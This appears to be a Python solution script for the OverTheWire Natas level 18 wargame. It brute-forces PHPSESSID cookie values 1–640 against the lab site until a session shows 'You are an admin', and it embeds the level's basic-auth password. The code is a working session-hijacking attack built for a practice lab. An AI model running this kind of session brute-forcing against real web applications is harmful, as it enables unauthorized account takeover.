import requests
from requests.auth import HTTPBasicAuth

for i in range(1,641):
	if i%10 == 0:
		print("progress ", str(i), " / 640")
	r = requests.post("http://natas18.natas.labs.overthewire.org/", cookies={"PHPSESSID":str(i)}, auth=HTTPBasicAuth('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')) 
	if(r.text.find("You are an admin") != -1):
		print(r.text)
		print(i)
		break